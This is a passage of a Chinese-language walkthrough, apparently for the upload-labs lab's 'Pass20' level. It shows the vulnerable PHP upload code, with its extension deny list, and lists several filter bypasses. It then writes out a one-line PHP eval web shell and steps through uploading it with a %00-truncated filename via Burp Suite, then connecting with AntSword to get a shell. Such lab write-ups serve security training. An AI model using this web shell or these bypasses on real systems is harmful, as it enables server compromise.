@@ -2379,3 +2379,121 @@ while True:
 
 ## Pass20
 
++ 首先查看提示
+
+![Pass20_01](./img/Pass20_01.PNG)
+
+
+
++ 查看源代码
+
+~~~ shell
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
+
+        $file_name = $_POST['save_name'];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) { 
+                $is_upload = true;
+            }else{
+                $msg = '上传出错！';
+            }
+        }else{
+            $msg = '禁止保存为该类型文件！';
+        }
+
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+~~~
+
+![Pass20_02](./img/Pass20_02.PNG)
+
+
+
++ 产生漏洞的代码
+
+~~~ shell
+$_POST传参导致文件上传路径可控
+
+$file_name = $_POST['save_name'];
+$img_path = UPLOAD_PATH . '/' .$file_name;
+~~~
+
+
+
+可利用的方法很多
+
+~~~ shell
+.user.ini绕过——Pass05
+大小写绕过——Pass06
+末尾加空格或点或::$DATA绕过——Pass07、08、09
+apache多后缀解析绕过
+POST型00截断绕过
+~~~
+
+
+
++ 原理
+
+~~~ tex
+没有对上传的文件做判断，只对用户输入的文件名做判断
+后缀名黑名单
+上传的文件名用户可控
+黑名单用于用户输入的文件后缀名进行判断
+move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /.
+~~~
+
+
+
++ 编写脚本<code>TwentyFirstMethod.php</code>
+
+~~~ php
+<?php
+	@eval($_POST['TwentyFirst']);
+?>
+~~~
+
+
+
++ 上传脚本<code>TwentyFirstMethod.php</code>到网站
+
+![Pass20_03](./img/Pass20_03.PNG)
+
+
+
++ 上传文件，文件名用%00截断，抓包解码；用<code>burpsuite</code>拦截并修改文件名和存储路径
+
+![Pass20_04](./img/Pass20_04.PNG)
+
+![Pass20_05](./img/Pass20_05.png)
+
+注意：<code>%00</code>截断需要<code>gpc</code>关闭，抓包，解码，提交即可，截断文件名<code>php</code>版本小于<code>5.3.4</code>才行
+
+
+
++ <code>burpsuite</code>放包后用右键打开文件并复制文件的路径
+
+![Pass20_06](./img/Pass20_06.png)
+
+![Pass20_07](./img/Pass20_07.PNG)
+
+
+
++ 用蚁剑添加数据并配置，<code>URL</code>是文件地址，连接密码根据上面编写的脚本
+
+![Pass20_08](./img/Pass20_08.PNG)
+
+
+
++ 成功添加数据后双击成功<code>getshell</code>
+
+![Pass20_09](./img/Pass20_09.PNG)
